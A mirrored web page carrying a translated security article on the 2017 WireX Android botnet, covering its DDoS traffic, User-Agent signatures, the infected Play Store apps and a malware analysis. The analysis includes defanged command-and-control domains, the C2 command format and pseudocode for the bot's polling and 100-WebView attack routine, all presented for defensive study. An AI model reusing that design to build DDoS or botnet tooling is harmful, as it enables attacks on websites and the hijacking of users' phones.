<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How to stop DDoS-attack + WireX Botnet code analysis</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="On August 17, 2017, several content providers and content delivery networks (CDN) were subjected to large-scale attacks by the botnet, called WireX. T...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How to stop DDoS-attack + WireX Botnet code analysis</h1><div class="post__text post__text-html js-mediator-article"> <a href="https://habrahabr.ru/company/cloud4y/blog/336614/"><img src="https://habrastorage.org/web/40a/1fa/3cc/40a1fa3ccd4d48f486a5b00c24f6da37.png"></a> <br><br>  On August 17, 2017, several content providers and content delivery networks (CDN) were subjected to large-scale attacks by the botnet, called WireX.  The WireX botnet includes mostly Android devices and is designed to create DDoS traffic.  A few days ago, Google deleted hundreds of infected applications that were available for download on the Play Store, and launched the process of removing them from all devices. <br><br>  Researchers from Akamai, Cloudflare, Flashpoint, Google, Oracle Dyn, RiskIQ, Team Cymru, and other organizations collaborated, working together to combat this botnet.  Evidence indicates that the botnet may have been active already on August 2, but it was the August 17 attack that attracted attention.  This article includes aggregate knowledge and describes the efforts of researchers working to neutralize a botnet. <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Attack Details </h3><br>  The first traces of the WireX botnet were left on August 2 in the form of attacks, which at that time went unnoticed.  They were discovered when researchers began searching for 26-character User-Agent records in journals.  The initial attacks were minimal and it is likely that the malware was in development or in the early stages of deployment.  Longer attacks have been identified since August 15, with at least 70,000 IP addresses participating in some (Figure 1). <br><br>  WireX is an application level DDoS attack.  The traffic generated by the attack nodes is basically HTTP GET requests, although some application variations seem to be able to issue POST requests.  In other words, a botnet creates traffic that resembles real requests from ordinary HTTP clients and web browsers. <br><br><img src="https://habrastorage.org/web/19d/3ec/367/19d3ec367e97419e899086024770789f.png"><br>  <i>Figure 1: Estimated botnet growth based on the number of unique IP addresses observed during attacks per hour.</i> <br><br>  Most of the traffic from this botnet was different using HTTP user-agent requests in the form of a random sequence of lowercase letters of the English alphabet. <br><br>  Some of the User-Agent entries are: <br><br> <code>User-Agent: jigpuzbcomkenhvladtwysqfxr <br> User-Agent: yudjmikcvzoqwsbflghtxpanre <br> User-Agent: mckvhaflwzbderiysoguxnqtpj <br> User-Agent: deogjvtynmcxzwfsbahirukqpl <br> User-Agent: fdmjczoeyarnuqkbgtlivsxhwp <br> User-Agent: yczfxlrenuqtwmavhojpigkdsb <br> User-Agent: dnlseufokcgvmajqzpbtrwyxih</code> <br> <br>  Malware variants that emit User-Agent entries of various lengths with an extended character set were also discovered.  Here are some examples: <br><br> <code>User-Agent: xlw2ibhqg0i <br> User-Agent: bg5pdrxhka2sjr1g <br> User-Agent: 5z5z39iit9damit5czrxf655ok060d544ytvx25g19hcg18jpo8vk3q <br> User-Agent: fge26sd5e1vnyp3bdmc6ie0 <br> User-Agent: m8al87qi9z5cqlwc8mb7ug85g47u <br> User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.9.1b3) <br> Gecko/20090305 Firefox/3.1b3 (.NET CLR 3.5.30729) <br> User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.7) <br> Gecko/20071018 BonEcho/2.0.0.7 <br> User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7; en-us) <br> AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2</code> <br> <br><h3>  Tracking attack nodes </h3><br>  An analysis of data on a DDoS attack on August 17 showed that devices from more than 100 countries of the world had participated, which is an uncharacteristic feature for botnets.  The distribution of attacking IP addresses, along with a special User-Agent record, led the researchers to speculate that other organizations may have also noticed or become victims of similar attacks.  Experts who started the investigation turned to colleagues from other organizations to test this hypothesis.  Together, the investigation began to develop rapidly.  Log analysis revealed a link between attacking IP addresses and malicious Android applications. <br><br>  The first and subsequent attacks included requests from the application with the same signature.  This brought the researchers to the "twdlphqg_v1.3.5_apkpure.com.apk" Android application, which they began to study in order to understand how the botnet works and identify related applications.  The search revealed several more applications from the same authors or authors with a similar name and comparable description (Figure 2).  When new applications were found, work began on analyzing their functionality. <br><br><img src="https://habrastorage.org/web/088/215/228/0882152286c54f31903058d7662c197e.png" width="500"><br>  <i>Figure 2: Screenshot of search results with similar malware.</i> <i><br></i> <br>  There were several cases when these applications were found in well-known mobile app stores.  In response to notification of malicious applications, Google provided the following comment: <br><br><blockquote>  We identified approximately 300 problem-related applications and blocked them in the Play Store.  We are in the process of removing them from all infected devices.  The findings of the researchers in conjunction with our own analysis allowed us to better protect Android users. </blockquote><br><h3>  Malware Review </h3><br>  Many of the applications were in the categories of media / video players, ringtones or utilities, such as file managers and application stores with additional features hidden to end users.  When launching applications, malicious components started their work by requesting a command from the command server, which most often was g.axclick.store, to initiate and direct the attack. <br><br>  Applications with functions to participate in DDoS attacks were benign for users who installed them.  These applications also used Android‚Äôs service architecture features, which allow applications to use system resources, even while in the background.  Thus, attacks could be launched when the application is not in use.  Currently, antiviruses recognize this malicious program as the Android Clicker Trojan, but it has nothing to do with click fraud.  Probably, this malware was associated with similar fraud, but was repurposed for DDoS attacks. <br><br><h3>  Malware Analysis </h3><br>  When checking various decompiled applications, several subdomains of the same root domain (axclick.store) were discovered, which were supposed to be part of the command and control (C2) infrastructure for the botnet. <br><br><pre> <code class="java hljs">$ grep http * -R com/twdlphqg/app/ExplorationActivity.smali: <span class="hljs-keyword"><span class="hljs-keyword">const</span></span>-string v3, <span class="hljs-string"><span class="hljs-string">"http://u[.]axclick[.]store/"</span></span> com/twdlphqg/app/services/Ryiidrxcjmfb.smali: <span class="hljs-keyword"><span class="hljs-keyword">const</span></span>-string v1, <span class="hljs-string"><span class="hljs-string">"http://g[.]axclick[.]store/"</span></span></code> </pre> <br>  The first domain (u [.] Axclick [.] Store) did not return the content, but transmitted an empty answer <b>200 OK</b> and, apparently, was used to test the connection to the Internet. <br><br>  The second domain (g [.] Axclick [.] Store) was associated with DDoS components of malware.  The application component that refers to this domain was responsible for creating an Android service equipped with two instances of WebView.  Android allows you to create your own window for browsing the web or even create your own clone of the browser using the WebView element.  The first instance of WebView served as a beacon, polling the C2 server for attack directives.  The second served as a link for cloning WebView for the purpose of attack.  This component also contains logic to configure these attacking instances. <br><br><h3>  Component overview </h3><br>  Below, using pseudo-code based on the knowledge gained from the decompiled APKs, parts of the components are considered separately. <br><br>  <b>ServiceRunner</b> <br><br>  The purpose of the component is to continue the application in the background.  Execution will be terminated only if the application is stopped by the user of the mobile device or if the device is rebooted. <br><br>  <i>Pseudocode Service Runner</i> <br><pre> <code class="java hljs">Class ServiceRunner extends Object { <span class="hljs-function"><span class="hljs-function">Public function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ DDoS_Service-&gt;poll_c2(); } }</code> </pre> <br>  <b>C2 parser</b> <br><br>  AttackCommandParser is launched when C2 WebView detects that page loading has occurred.  The parser loads the contents of the page and extracts the body as a command to attack.  Based on the observed samples, the payload from C2 is as follows: <br><br><pre> <code class="php hljs">&lt;html&gt; &lt;title&gt; https:<span class="hljs-comment"><span class="hljs-comment">//A_TARGETED_WEBSITE/snewxwriA_USER_AGENT_STRINGsnewxwrihttps://A_REFER_HEADER_VALUE/ &lt;/title&gt; &lt;/html&gt;</span></span></code> </pre> <br>  <i>Example of team to attack</i> <br><br>  The value extracted from the title tag is then checked with String-&gt; contains () to ensure that it contains the snewxwri separator.  If it is found, the content is divided.  The result is then used as parameters that must be passed to the DDoS_Service-&gt; attack () method. <br><br>  <i>Pseudocode for parsing answers</i> <br><pre> <code class="java hljs">Class AttackCommandParser extends WebViewClient { <span class="hljs-function"><span class="hljs-function">Public function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onPageFinished</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(C2_WebView,C2_url)</span></span></span><span class="hljs-function"> </span></span>{ String pageTitle = C2_WebView-&gt;getTitle(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (pageTitle-&gt;contains(‚Äúsnewxwri‚Äù) == <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { pageTitle = pageTitle-&gt;trim(); Array commandParts = pageTitle.split(‚Äúsnewxwri‚Äù); String target = commandParts[<span class="hljs-number"><span class="hljs-number">0</span></span>]; String userAgent = commandParts[<span class="hljs-number"><span class="hljs-number">1</span></span>]; String referer = commandParts[<span class="hljs-number"><span class="hljs-number">2</span></span>]; DDoS_Service-&gt;attack(target, userAgent, referer); } } }</code> </pre> <br><br>  <b>DDoS service</b> <br><br>  The main function of the DDoS_Service component is to create a WebView to load any specified URL selected in C2 WebView into the WebView container itself, rather than launching a browser.  After this, the attack is launched. <br><br>  <i>Pseudocode DDoS Service</i> <br><pre> <code class="java hljs">Class DDoS_Service extends Object { <span class="hljs-function"><span class="hljs-function">Public function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ Handler OS_Handler = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Handler(); Object Runner = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ServiceRunner(); OS_Handler-&gt;postDelayed(Runner,<span class="hljs-number"><span class="hljs-number">2</span></span>); } <span class="hljs-function"><span class="hljs-function">Public function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">poll_c2</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ WebViewClient C2_Parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> AttackCommandParser(); WebView C2_WebView = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> WebView(); WebViewSettings C2_WebView_Settings = C2_WebView-&gt;getSettings(); C2_WebView_Settings-&gt;setCacheMode(LOAD_NO_CACHE); C2_WebView-&gt;clearCache(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); C2_WebView-&gt;clearHistory(); C2_WebView-&gt;setWebViewClient(C2_Parser); C2_WebView-&gt;loadUrl(‚Äúhttp:<span class="hljs-comment"><span class="hljs-comment">//g[.]axclick[.]store‚Äù); } Public function attack(String target, String userAgent, String referer) { HashMap WebViewHeaders = new HashMap(); WebViewHeaders-&gt;put(‚ÄúReferer‚Äù,referer); WebViewHeaders-&gt;put(‚ÄúX-Requested-With‚Äù,‚Äù‚Äù); WebView[] AttackerViews = new WebView[100]; for (int i=0; i&lt;AttackerViews.length; i++) { AttackerViews[i] = new WebView(); AttackerViews[i]-&gt;clearHistory(); AttackerViews[i]-&gt;clearFormData(); AttackerViews[i]-&gt;clearCache(true); WebViewSettings AttackWebViewSettings = AttackerViews[i]-&gt;getSettings(); AttackWebViewSettings-&gt;setJavaScriptEnabled(true); AttackWebViewSettings-&gt;setUserAgentString(userAgent); AttackWebViewSettings-&gt;setCacheMode(LOAD_NO_CACHE); this-&gt;deleteDatabase(‚Äúwebview.db‚Äù); this-&gt;deleteDatabase(‚ÄúwebviewCache.db‚Äù); AttackerViews[i]-&gt;loadUrl(target,WebViewHeaders); } } }</span></span></code> </pre> <br>  The onCreate () method creates a new instance of android / os / Handler and ServiceRunner.  The poll_c2 () method is responsible for constantly reloading the WebView using the C2 URL.  Before polling C2 domains, the service clears and disables the cache, and also clears the history of WebView instances.  These steps are performed to ensure that the client always receives relevant information and does not process requests using the cache.  The attack () method is responsible for creating the actual attack traffic. <br><br><h3>  User experience when working with malware </h3><br>  Although many of the infected applications have already been deleted from the Google Play Store, mirrors remained on the network, from which it is possible to download APK files.  We downloaded twdlphqg (one of the attacking apps) on the physical Samsung Galaxy S4 with Android Lollipop and security patches of 2015. <br><br><img src="https://habrastorage.org/web/e3b/d37/c24/e3bd37c248b948068d3173bfca64f7bd.png"><br><br>  This application, like the others we tested, had innocuous names, such as ‚ÄúDevice Analysis‚Äù, ‚ÄúData Storage‚Äù, ‚ÄúPackage Manager‚Äù and so on. <br><br>  When the application starts, it looks like a simple application for ringtones.  Only three ringing tones are provided.  It can play and install ringtones and has no other functions. <br><br><img src="https://habrastorage.org/web/67b/38a/7c2/67b38a7c25c94e7ba4c7e8d7bba5ee22.png" width="300"><br><br>  This application launches additional processes in the background, which continue to work and can participate in a DDoS attack, even when the phone screen is locked.  When we put the phone on the charger in sleep mode, the processes responsible for the DDoS attack did not stop. <br><br><img src="https://habrastorage.org/web/493/8d5/b2b/4938d5b2b39843b4ac5c3ebb02e4f17b.png" width="300"><br><br>  It is noteworthy that at the moment it is impossible to install these applications, because Google‚Äôs PlayProtect function blocks them.  All applications that have been identified have become part of a campaign to remove problematic and already installed applications from devices.  Now, to run this malware, you need to disable PlayProtect in the settings. <br><br><img src="https://habrastorage.org/web/b5a/3b0/e5c/b5a3b0e5cf36446ca5fa7ffd67afba6b.png" width="300"><br><br><h3>  Conclusion </h3><br>  These discoveries were possible only through collaboration between various IT organizations.  Each had its own piece of the puzzle: without the contribution of each company, this botnet would probably remain a mystery for a long time. <br><br>  The best thing organizations can do in a DDoS attack is to share detailed metrics related to the attack.  With this information, those who specialize in <a href="https://cloud4y.ru/cloud-hosting/anti-ddos/">DDoS protection</a> can learn much more and minimize negative consequences. <br><br>  Useful information may include captured packets, lists of attacking IP addresses, ransom records, request headers, and any suspicious patterns.  Such data should not contain legitimate client traffic to minimize confidentiality problems, and also because such traffic can slow down the analysis.  And most importantly, to give permission for the transfer of this data to trusted contacts in the wider IT-security community that may have the necessary experience. <br><br><div class="spoiler">  <b class="spoiler_title">Thanks to the researchers from Akamai, Cloudflare, Flashpoint, Google, RiskIQ, Team Cymru, FBI and other organizations that did not make the list.</b> <div class="spoiler_text">  <i>Tim April: Senior Security Architect @ Akamai</i> <i><br></i>  <i>Chris Baker: Principal of Threat Intelligence @ Oracle Dyn</i> <i><br></i>  <i>Matt carothers</i> <i><br></i>  <i>Jaime Cochran: Security Analyst @ Cloudflare</i> <i><br></i>  <i>Marek Majkowski: Enthusiastic Geek @ Cloudflare</i> <i><br></i>  <i>Jared Mauch: Internetworking Research and Architecture @ Akamai</i> <i><br></i>  <i>Allison Nixon: Director of Security Research @ Flashpoint</i> <i><br></i>  <i>Justin Paine: Head Of Trust &amp; Safety @ Cloudflare</i> <i><br></i>  <i>Chad Seaman: Sen.</i>  <i>Security Intelligence Response Team Engineer @ Akamai SIRT</i> <i><br></i>  <i>Darren Spruell: Threat Researcher @ RiskIQ</i> <i><br></i>  <i>Zach Wikholm: Research Developer @ Flashpoint</i> <i><br></i>  <i>other.</i> </div></div></div><p>Source: <a href="https://habr.com/ru/post/336614/">https://habr.com/ru/post/336614/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../336604/index.html">Collecting Windows Server 2016 Boot Event Data</a></li>
<li><a href="../336606/index.html">How to develop an effective project management plan and learn how to prevent problems before they occur</a></li>
<li><a href="../336608/index.html">Python for network engineers: getting started</a></li>
<li><a href="../336610/index.html">PostgreSQL partitioning with pg_pathman</a></li>
<li><a href="../336612/index.html">Flappy Bird Machine Learning Algorithm</a></li>
<li><a href="../336620/index.html">As a newcomer to Go, cont.</a></li>
<li><a href="../336622/index.html">Submit the cool project: utbone core library for unit testing</a></li>
<li><a href="../336624/index.html">Heading "We read articles for you." August 2017</a></li>
<li><a href="../336626/index.html">Interview with Sergey Vakula: ‚ÄúI don‚Äôt believe that blockchain and cryptocurrency will become massive‚Äù</a></li>
<li><a href="../336630/index.html">Linux graphical environment without a single break</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>